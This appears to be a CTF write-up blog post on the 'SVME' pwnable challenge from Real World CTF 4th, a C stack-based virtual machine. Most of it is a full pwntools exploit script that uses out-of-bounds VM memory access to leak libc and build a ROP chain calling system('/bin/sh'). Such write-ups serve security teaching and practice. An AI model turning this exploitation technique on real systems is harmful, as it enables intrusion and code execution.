---
title: SVME
date: 2026-06-04 03:00:00 +0000
categories: [CTF, Upsolve]
tags: [pwnable]
math: true
mermaid: true
media_subpath: /assets/posts/2026-06-03-real-world-ctf-svme
image:
  path: preview.png
---

## Real World CTF 4th - SVME

### Overview

- **Challenge Name** : SVME
- **Author** ; un1c0rn
- **Description** : "Professor Terence Parr has taught us how to [build a virtual machine](https://www.slideshare.net/parrt/how-to-build-a-virtual-machine). Now it's time to break it!" 
- **Date** : 2022-01-23

The `SVME` binary challenge is a simple stack-based virtual machine written in C, based on Terence Parr's reference implementation.

Here's the source for the [vm](https://github.com/parrt/simple-virtual-machine-C)

The challenge files can be found ![here](pwn_svme.zip)

The bug is an *out-of-bounds read/write* in the VM memory layout.

By abusing it, you can corrupt VM state and eventually get code execution.

### Analysis

We are given 3 files (svme, libc, linker)

![checksec](checksec.png)

And the binary `svme` has all protections enabled.

First thing to do is patched it using `pwninit`

```bash
pwninit --bin svme --libc libc-2.31.so --ld ld-2.31.so --no-template
```

With that, the binary should be linked with the one provided

```bash
mark@rwx:~/Desktop/Practice/BinExp/Challs/STACK/Svme$ ldd svme_patched 
	linux-vdso.so.1 (0x00007ffff7fc3000)
	libc.so.6 => ./libc.so.6 (0x00007ffff7dc2000)
	ld-2.31.so => /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fc5000)
mark@rwx:~/Desktop/Practice/BinExp/Challs/STACK/Svme
```

The attached slide is a presentation on "How to Build a Virtual Machine"

![intro](intro.png)

> The goal is to simulate a simple computer using bytecodes. An instruction set is defined including operations like add, subtract, branch, load, store, print. The bytecode format and a sample program are shown in the slide. The VM will fetch, decode and execute instructions in a cycle, operating on a stack. 
{: .prompt-tip }



Here's the file solve script:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('svme_patched')
libc = exe.libc

context.terminal = ['gnome-terminal', '--maximize', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
brva 0x19BE
add-symbol-file vm.o 0x0
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

IADD_OP   = 0x1
ISUB_OP   = 0x2
IMUL_OP   = 0x3
ILT_OP    = 0x4
IEQ_OP    = 0x5
BR_OP     = 0x6
BRT_OP    = 0x7
BRF_OP    = 0x8
ICONST_OP = 0x9
LOAD_OP   = 0x0a
GLOAD_OP  = 0x0b
STORE_OP  = 0x0c
GSTORE_OP = 0x0d
PRINT_OP  = 0x0e
POP_OP    = 0x0f
CALL_OP   = 0x10
RET_OP    = 0x11
HLT_OP    = 0x12

def init():
    global io

    io = start()

def op_add():
    return p32(IADD_OP)

def op_sub():
    return p32(ISUB_OP)

def op_iconst(arg):
    return p32(ICONST_OP) + p32(arg, signed=True)

def op_load(arg):
    return p32(LOAD_OP) + p32(arg, signed=True)

def op_gload(arg):
    return p32(GLOAD_OP) + p32(arg, signed=True)

def op_store(arg):
    return p32(STORE_OP) + p32(arg, signed=True)

def op_gstore(arg):
    return p32(GSTORE_OP) + p32(arg, signed=True)

def op_pop():
    return p32(POP_OP)

def op_hlt():
    return p32(HLT_OP)

def solve():

    payload = b""

    """
    first we:
    - save the global pointer & code pointer stored in the VM structure to the vm stack
    - calculate the address to the return address
    """

    payload += op_iconst(0x1337)
    payload += op_gload(-(0x20f0 // 4))
    payload += op_gload(-(0x20ec // 4))
    payload += op_gload(-(0x2100 // 4))
    payload += op_iconst(0x218)
    payload += op_add()
    payload += op_gload(-(0x20fc // 4))

    """
    now there are many things we can do from here, but i decided to:
    - leak libc by ovewriting vm->globals with the return address of the main stack frame which contains a pointer to __libc_start_main
    - we can do the read inplace (store it on the vm stack)
    - compute offsets to ROPchain and write rop to the stack
    - rewrite vm->globals to NULL for future vm_free 
    - halt vm to get shell!
    """

    rop = ROP(libc)
    pop_rdi_offset = rop.find_gadget(["pop rdi", "ret"]).address

    pop_rdi = -(libc.sym["__libc_start_main"] + 0xf3 - pop_rdi_offset)
    sh      = next(libc.search(b"/bin/sh")) - libc.sym["__libc_start_main"] - 0xf3
    system  = libc.sym["system"] - libc.sym["__libc_start_main"] - 0xf3
    ret     = pop_rdi + 1

    libc_consts = [
        ret,
        pop_rdi,
        sh,
        system
    ][::-1]

    payload += op_store(-(0xf80 // 4))
    payload += op_store(-(0xf84 // 4))
    
    for i in range(len(libc_consts)):
        payload += op_gload(0)
        payload += op_iconst(libc_consts[i])
        payload += op_add()
        payload += op_gload(1)

    for i in range(0, 8, 2):
        payload += op_gstore(i + 1)
        payload += op_gstore(i)
    
    payload += op_iconst(0x0) * 2
    payload += op_store(-(0xf80 // 4))
    payload += op_store(-(0xf84 // 4))

    payload += op_hlt()

    payload = payload.ljust(0x1FF, b'\x00')

    io.sendline(payload)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
```

Running it works!

![final](final.png)